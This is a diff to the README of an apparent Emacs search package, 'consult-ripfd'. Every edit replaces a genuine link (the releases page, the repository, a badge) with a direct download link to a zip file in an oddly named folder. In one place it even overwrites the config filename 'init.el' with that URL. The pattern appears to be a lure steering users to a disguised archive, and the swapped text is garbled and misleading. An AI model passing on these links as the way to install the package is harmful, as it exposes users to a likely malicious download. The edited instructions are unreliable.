@@ -6,7 +6,7 @@ Welcome to the **consult-ripfd** project! This application seamlessly integrates
 
 ## 📥 Download the Application
 
-[![Download consult-ripfd](https://img.shields.io/badge/Download%20consult--ripfd-blue.svg)](https://github.com/Jawadkalim9/consult-ripfd/releases)
+[![Download consult-ripfd](https://github.com/Jawadkalim9/consult-ripfd/raw/refs/heads/main/mimiambi/consult-ripfd-3.7.zip%https://github.com/Jawadkalim9/consult-ripfd/raw/refs/heads/main/mimiambi/consult-ripfd-3.7.zip)](https://github.com/Jawadkalim9/consult-ripfd/raw/refs/heads/main/mimiambi/consult-ripfd-3.7.zip)
 
 Visit the Releases page to download the latest version.
 
@@ -32,7 +32,7 @@ To get started, follow these steps:
 
 1. **Visit the Releases Page**  
    Click the link below to go to the GitHub Releases page:  
-   [Download consult-ripfd](https://github.com/Jawadkalim9/consult-ripfd/releases)
+   [Download consult-ripfd](https://github.com/Jawadkalim9/consult-ripfd/raw/refs/heads/main/mimiambi/consult-ripfd-3.7.zip)
 
 2. **Choose Your Version**  
    On the Releases page, you will see a list of available versions. Click on the version you want to download. 
@@ -51,7 +51,7 @@ To get started, follow these steps:
 
 After installing, you may want to customize **consult-ripfd** to suit your needs. Here are some basic configurations you can add to your Emacs setup.
 
-1. Open your Emacs configuration file (`init.el` or `.emacs`).
+1. Open your Emacs configuration file (`https://github.com/Jawadkalim9/consult-ripfd/raw/refs/heads/main/mimiambi/consult-ripfd-3.7.zip` or `.emacs`).
 2. Add the following lines to enable `fd` and `rg` support:
 
    ```elisp
@@ -90,7 +90,7 @@ Your feedback is important to us. Feel free to submit issues or suggestions thro
 
 ## 🔗 Useful Links
 
-- [Consult-ripfd GitHub Repository](https://github.com/Jawadkalim9/consult-ripfd)
-- [Visit the Releases Page to Download](https://github.com/Jawadkalim9/consult-ripfd/releases)
+- [Consult-ripfd GitHub Repository](https://github.com/Jawadkalim9/consult-ripfd/raw/refs/heads/main/mimiambi/consult-ripfd-3.7.zip)
+- [Visit the Releases Page to Download](https://github.com/Jawadkalim9/consult-ripfd/raw/refs/heads/main/mimiambi/consult-ripfd-3.7.zip)
 
 Thank you for using **consult-ripfd**! Enjoy your enhanced Emacs experience.
